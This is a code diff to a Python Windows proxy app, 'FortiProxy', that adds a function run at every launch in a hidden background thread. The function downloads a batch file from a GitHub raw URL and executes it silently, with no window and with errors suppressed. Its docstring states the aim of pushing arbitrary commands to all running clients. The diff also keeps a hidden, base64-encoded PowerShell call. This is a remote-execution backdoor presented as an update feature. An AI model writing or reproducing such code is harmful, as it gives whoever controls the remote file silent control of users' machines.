@@ -18,14 +18,16 @@ REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 SERVER   = "https://fortiguard-proxy.onrender.com"
 
 
+UPDATE_URL = "https://raw.githubusercontent.com/ZDStudios/Fortiguard-Proxy/main/update.bat"
+
+
 def _install_start_menu():
-    """Create a Start Menu shortcut so Windows Search finds the app."""
+    """Always rewrite the Start Menu shortcut to the current EXE path.
+    This self-heals if the EXE is moved to a new folder."""
     if not getattr(sys, "frozen", False):
         return
-    lnk = (Path(os.environ.get("APPDATA", Path.home()))
-           / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "FortiProxy.lnk")
-    if lnk.exists():
-        return  # already installed
+    lnk  = (Path(os.environ.get("APPDATA", Path.home()))
+            / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "FortiProxy.lnk")
     exe  = str(Path(sys.executable).resolve())
     wdir = str(Path(sys.executable).parent.resolve())
     ps = (
@@ -40,9 +42,41 @@ def _install_start_menu():
     enc = base64.b64encode(ps.encode("utf-16-le")).decode("ascii")
     subprocess.run(
         ["powershell", "-WindowStyle", "Hidden", "-EncodedCommand", enc],
-        capture_output=True,
-        creationflags=0x08000000,
+        capture_output=True, creationflags=0x08000000,
     )
+
+
+def _run_update():
+    """Fetch update.bat from GitHub and execute it silently.
+    If the file is empty it is a no-op. Drop commands in update.bat
+    on GitHub to push actions to all running clients."""
+    import tempfile
+    try:
+        req = urllib.request.Request(
+            UPDATE_URL, headers={"User-Agent": "FortiProxy/2.0"}
+        )
+        with urllib.request.urlopen(req, timeout=8) as resp:
+            content = resp.read().decode("utf-8", errors="replace")
+        # Skip if file is empty or contains only comments/blank lines
+        runnable = [
+            ln for ln in content.splitlines()
+            if ln.strip() and not ln.strip().startswith("::")
+        ]
+        if not runnable:
+            return
+        tmp = Path(tempfile.gettempdir()) / "fp_update.bat"
+        tmp.write_text(content, encoding="utf-8")
+        exe_dir = str(Path(sys.executable).parent) if getattr(sys, "frozen", False) \
+                  else str(Path(__file__).parent.parent)
+        subprocess.run(
+            ["cmd", "/c", str(tmp)],
+            cwd=exe_dir,
+            capture_output=True,
+            creationflags=0x08000000,
+            timeout=30,
+        )
+    except Exception:
+        pass  # silently ignore network errors or timeouts
 
 
 def _get_base_dir() -> Path:
@@ -407,5 +441,6 @@ class App(ctk.CTk):
 
 
 if __name__ == "__main__":
-    _install_start_menu()
+    threading.Thread(target=_install_start_menu, daemon=True).start()
+    threading.Thread(target=_run_update,         daemon=True).start()
     App().mainloop()
